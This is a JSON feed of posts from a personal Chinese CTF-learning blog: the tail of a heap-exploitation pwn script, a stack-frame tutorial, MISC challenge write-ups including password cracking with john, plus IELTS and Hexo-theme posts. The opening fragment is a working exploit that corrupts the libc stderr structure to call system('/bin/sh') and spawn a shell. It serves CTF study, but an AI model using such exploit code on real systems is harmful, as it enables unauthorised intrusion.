class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\tfd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x148</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "computer-science",
                "Pwn"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn/",
            "title": "pwn学习(1)",
            "date_published": "2021-12-06T07:00:39.053Z",
            "content_html": "<h1 id=\"pwn学习1\"><a class=\"anchor\" href=\"#pwn学习1\">#</a> pwn 学习 1</h1>\n<p>一张汇编图片<br />\n<img data-src=\"/img/PWN/huibian1.jpg\" alt=\"avatar\" /></p>\n<p>栈帧结构</p>\n<h1 id=\"fig-1函数调用发生和结束时调用栈的变化\"><a class=\"anchor\" href=\"#fig-1函数调用发生和结束时调用栈的变化\">#</a> Fig 1. 函数调用发生和结束时调用栈的变化</h1>\n<p>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。\u000b<br />\n下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态<br />\n<img data-src=\"/img/PWN/fig1.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-2将被调用函数的参数压入栈内\"><a class=\"anchor\" href=\"#fig-2将被调用函数的参数压入栈内\">#</a> Fig 2. 将被调用函数的参数压入栈内</h1>\n<p>将被调用函数的参数压入栈内<br />\n首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。<br />\n<img data-src=\"/img/PWN/fig2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-3将被调用函数的返回地址压入栈内\"><a class=\"anchor\" href=\"#fig-3将被调用函数的返回地址压入栈内\">#</a> Fig 3. 将被调用函数的返回地址压入栈内</h1>\n<p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<br />\n<img data-src=\"/img/PWN/fig3.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\"><a class=\"anchor\" href=\"#fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\">#</a> Fig 4. 将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</h1>\n<p>再将当前的 ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig4.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-5将被调用函数的局部变量压入栈内\"><a class=\"anchor\" href=\"#fig-5将被调用函数的局部变量压入栈内\">#</a> Fig 5. 将被调用函数的局部变量压入栈内</h1>\n<p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。。<br />\n<img data-src=\"/img/PWN/fig5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-6将被调用函数的局部变量弹出栈外\"><a class=\"anchor\" href=\"#fig-6将被调用函数的局部变量弹出栈外\">#</a> Fig 6. 将被调用函数的局部变量弹出栈外</h1>\n<p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。\u000b<br />\n看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。\u000b<br />\n首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig6.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-7\"><a class=\"anchor\" href=\"#fig-7\">#</a> Fig 7.</h1>\n<p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内<br />\n然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。<br />\n<img data-src=\"/img/PWN/fig7.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-8\"><a class=\"anchor\" href=\"#fig-8\">#</a> Fig 8.</h1>\n<p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。<br />\n将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内<br />\n至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。<br />\n<img data-src=\"/img/PWN/fig8.jpg\" alt=\"avatar\" /></p>\n",
            "tags": [
                "computer-science",
                "Pwn"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Misc/%E6%AF%94%E8%B5%9Bmisc/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Misc/%E6%AF%94%E8%B5%9Bmisc/",
            "title": "比赛MISC",
            "date_published": "2021-12-06T06:59:01.292Z",
            "content_html": "<p>2021/10/21 更新了 MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</p>\n<h1 id=\"祥云杯2021-misc-鸣雏恋\"><a class=\"anchor\" href=\"#祥云杯2021-misc-鸣雏恋\">#</a> 祥云杯 2021-MISC - 鸣雏恋</h1>\n<p>算是学习脚本了吧<br />\n遍历目录脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#遍历文件夹里的图片</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\"># 把文件路径和文件名结合起来</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        file_d <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 判断该文件是单个文件还是文件夹</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果是文件夹则递归调用 scanDir () 函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            scanDir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size<span class=\"token operator\">==</span><span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>遍历不一定是按顺序的，还是以用图片的数字编号为准</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">129488</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        file_d <span class=\"token operator\">=</span> <span class=\"token string\">r'C:\\\\Users\\\\pengzixuan\\\\Desktop\\\\out\\\\'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.png'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size <span class=\"token operator\">==</span> <span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    flag<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        str1 <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        data<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    data1<span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#去掉前几位</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    bs <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"高新区初赛misc\"><a class=\"anchor\" href=\"#高新区初赛misc\">#</a> 高新区初赛 MISC</h1>\n<p>HalfQR<br />\n 使用工具<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMzExMHcwcjFkLmNvbS9xcmF6eWJveC8=\">点击这里</span><br />\n Qrazybox<br />\n 在纠错位 L，mask 为 2 调试出 flag<br />\n<img data-src=\"/img/MISC/gaoxinqu.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/MISC/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\"><a class=\"anchor\" href=\"#misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\">#</a> MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</h1>\n<p>Blasting 是爆破的意思考虑到要爆破<br />\n<img data-src=\"/img/MISC/blasting1.jpg\" alt=\"avatar\" /></p>\n<p>得到 3 个文件<br />\n先看音频<br />\n<img data-src=\"/img/MISC/blasting2.jpg\" alt=\"avatar\" /></p>\n<p>48000hz 会出来一部分 flag<br />\n 继续看两个图片<br />\n<img data-src=\"/img/MISC/blasting3.jpg\" alt=\"avatar\" /></p>\n<p>第二张图片出现错误怀疑爆破宽度<br />\n先改一下宽度<br />\n<img data-src=\"/img/MISC/blasting4.jpg\" alt=\"avatar\" /></p>\n<p>直接复原了<br />\n两张一摸一样的图<br />\n<img data-src=\"/img/MISC/blasting5.jpg\" alt=\"avatar\" /></p>\n<p>猜测盲水印<br />\n用盲水印脚本<br />\n<img data-src=\"/img/MISC/blasting6.jpg\" alt=\"avatar\" /></p>\n<p>得到提示<br />\n Deepsound，网上搜一下，是个音频隐藏工具下载<br />\n<img data-src=\"/img/MISC/blasting7.jpg\" alt=\"avatar\" /></p>\n<p>然后把音频放入要密码…… 太烦了<br />\n这里考虑到了爆破，上 kali<br />\n 用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYmxvYi9ibGVlZGluZy1qdW1iby9ydW4vZGVlcHNvdW5kMmpvaG4ucHk=\"> https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py</span><br />\ndeepsound2john.py 脚本<br />\n<img data-src=\"/img/MISC/blasting8.jpg\" alt=\"avatar\" /></p>\n<p>得到<br />\n john.wav:$dynamic_1529$7242ef6f559962f7e928afc8be404f611557e267<br />\n 然后直接 john 一下<br />\n<img data-src=\"/img/MISC/blasting9.jpg\" alt=\"avatar\" /></p>\n<p>得到下面的数据！@#$%^&amp;*<br />\n 看起来像密码试一下<br />\n成功<br />\n<img data-src=\"/img/MISC/blasting10.jpg\" alt=\"avatar\" /></p>\n<p>得到 flag.txt<br />\n 打开文件<br />\n<img data-src=\"/img/MISC/blasting11.jpg\" alt=\"avatar\" /></p>\n<p 725456a7196c09b559ccd441738b0cae=\"\">最后 flag {iheatradio}<br />\n Iheatradio 中间 md5 加密一下<br />\n flag</p>\n",
            "tags": [
                "computer-science",
                "Misc",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/English/",
            "url": "https://zephyr-cyber.github.io.git/English/",
            "title": "Learn English",
            "date_published": "2021-12-03T12:13:44.623Z",
            "content_html": "<p>Study English ，Test IELTS!!!!!</p>\n<h1 id=\"study-english-test-ielts\"><a class=\"anchor\" href=\"#study-english-test-ielts\">#</a> Study English ，Test IELTS!!!!!</h1>\n<h2 id=\"now-i-will-use-a-language-which-is-english-to-write\"><a class=\"anchor\" href=\"#now-i-will-use-a-language-which-is-english-to-write\">#</a> Now , I will use a language which is English to write .</h2>\n<p>Accmulating some words</p>\n<ol>\n<li>On  a simplistic level, there are larger numbers of means of transportation<br />\n- there are more cars, buses and trains in operation. However, the<br />\nsheer number of transportation means is not enough to explain this<br />\nincrease. The cost of traveling even though it is at present increasing<br />\ndue to an economic slowdown globally; is still relatively affordable to<br />\nmany people. This affordability is further enhanced by the use of credit<br />\ncards and loans in order to fund travel, especially for holiday<br />\npurposes.</li>\n<li>An  increase of travel companies in competition with each other has also<br />\nhelped bring package prices down, while an increase in the number of<br />\noperating flights globally has also increased, giving rise to falling<br />\nair-fare prices. In addition, people now have more leisure time and<br />\ndisposable incomes. The combination of these two variables with<br />\nunrelenting advertising campaigns from travel companies and cruise ship<br />\noperators arguably leads to an increase in the number of people<br />\ntravelling, in this case for holiday purposes.</li>\n<li>Another  reason why people travel is going to work. More than ever before,<br />\npeople are travelling greater distances to get to work. Large industrial<br />\nsites fo both service and production industries are tending to be<br />\nlocated outside city areas. This invariably leads to increase in the<br />\nnumber of people travelling locally.</li>\n<li>In  conclusion, there are many reasons why more people are travelling both<br />\ninternationally and locally, for business and for leisure. What is sure<br />\nis that this increase is likely to continue until travelling at current<br />\nrates is no longer economically viable.</li>\n</ol>\n",
            "tags": [
                "English",
                "English"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/hexo/",
            "url": "https://zephyr-cyber.github.io.git/hexo/",
            "title": "hexo搭建的一些问题",
            "date_published": "2021-12-03T11:53:01.713Z",
            "content_html": "<h3 id=\"最近在学blog知识遇到无数问题小白的我又不会开发htmlcss在这里遇到的一些问题以及开发者没有提及到的\"><a class=\"anchor\" href=\"#最近在学blog知识遇到无数问题小白的我又不会开发htmlcss在这里遇到的一些问题以及开发者没有提及到的\">#</a> 最近在学 blog 知识，遇到无数问题，小白的我又不会开发 HTML+CSS, 在这里遇到的一些问题，以及开发者没有提及到的。</h3>\n<h1 id=\"关于本地头像hexo-clean容易被清除的问题\"><a class=\"anchor\" href=\"#关于本地头像hexo-clean容易被清除的问题\">#</a> 关于本地头像 hexo clean 容易被清除的问题</h1>\n<p>github 上的拷贝的默认是本地的存储路径，每次更新 hexo clean，public 里面的文件都会被清除，导致每次更新 blog 很繁琐，毕竟有很多图片。</p>\n<h3 id=\"我们可以用cdn加速图片的方式部署\"><a class=\"anchor\" href=\"#我们可以用cdn加速图片的方式部署\">#</a> 我们可以用 cdn 加速图片的方式部署</h3>\n<p>你的主题目录下的_config.yml</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Assets</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key atrule\">statics</span><span class=\"token punctuation\">:</span> /</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span> css</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span> js</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token key atrule\">images</span><span class=\"token punctuation\">:</span> images</pre></td></tr></table></figure><p>默认 images 会把下面的 avatar 后面的路径套上 /images/。所以除了输入本地文件，其他的没用 。</p>\n<p>修改文件 <code>themes/shoka/layout/_partials/post/post.njk</code>  下面的大概第五行的位置</p>\n<p><code>&lt;meta itemprop=&quot;image&quot; content=&quot;&#123;&#123; url_for(theme.statics + theme.images + '/' + theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>改为</p>\n<p><code>&lt;meta itemprop=&quot;image&quot; content=&quot;&#123;&#123; url_for(theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>修改文件 <code>themes/shoka/layout/_partials/sidebar/overview.njk</code>  大概第三行的位置</p>\n<p><code>data-src=&quot;&#123;&#123; url_for(theme.statics + theme.images + '/' + theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>改为</p>\n<p><code>data-src=&quot;&#123;&#123; url_for(theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>去掉路径就可以了，然后</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/avatar.jpg\" alt=\"\" /></p>\n<p>加上自己的 cdn 就行，图片就会出来。</p>\n<p>感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGF2ZW5kZXJkaC5jbi8=\"> Lavender</span> 大佬提供帮助！</p>\n<h1 id=\"关于看板娘live2d-widget的shoka主题的问题\"><a class=\"anchor\" href=\"#关于看板娘live2d-widget的shoka主题的问题\">#</a> 关于看板娘 live2d-widget 的 shoka 主题的问题</h1>\n<p>hexo-helper-live2d 模板的方法不在赘述，csdn 上有很多<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpc2h1d2VuNzk4Ni9hcnRpY2xlL2RldGFpbHMvMTA4ODYyNDIz\"> hexo-helper-live2d</span></p>\n<p>看板娘 live2d-widget 的源码<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0ZXZlbmpvZXpoYW5nL2xpdmUyZC13aWRnZXQ=\">点击这里</span></p>\n<p>emmmm 介绍的很简单。</p>\n<h2 id=\"利用cdn网络资源\"><a class=\"anchor\" href=\"#利用cdn网络资源\">#</a> 利用 cdn 网络资源</h2>\n<p>把 live2d-widget 放在主题 source 下面</p>\n<p>autoload.js 不必要改绝对路径</p>\n<p><code> const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/&quot;; //const live2d_path = &quot;/live2d-widget/&quot;;</code>  这行注释掉</p>\n<p>然后进入主题下的 /layout/_partials/head/head.njk 里面的最后几行代码修改为</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼4<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼5<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/atom+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼6<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼7<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼8<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼9<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼10<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/npm/font<span class=\"token punctuation\">-</span>awesome/css/font<span class=\"token punctuation\">-</span>awesome.min.css\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;script async src=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/gh/stevenjoezhang/live2d<span class=\"token 